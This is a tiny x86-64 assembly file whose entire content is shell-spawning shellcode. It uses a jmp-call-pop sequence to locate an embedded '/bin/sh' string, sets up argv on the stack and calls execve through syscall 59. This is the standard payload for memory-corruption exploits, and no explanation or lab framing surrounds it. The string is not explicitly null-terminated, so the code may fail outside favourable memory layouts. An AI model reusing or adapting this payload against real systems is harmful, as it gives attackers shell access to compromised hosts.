.section .text
.global _start
_start:
jmp c1
pp: popq %rcx 
pushq %rbp 
mov %rsp, %rbp
subq $0x30, %rsp
movq %rcx, -0x20(%rbp) 
xorq %rax, %rax
movq %rax,-0x18(%rbp)
movq %rax, %rdx
lea -0x20(%rbp), %rsi
mov -0x20(%rbp), %rdi
mov $59, %rax
syscall 
c1: call pp

.ascii "/bin/sh"

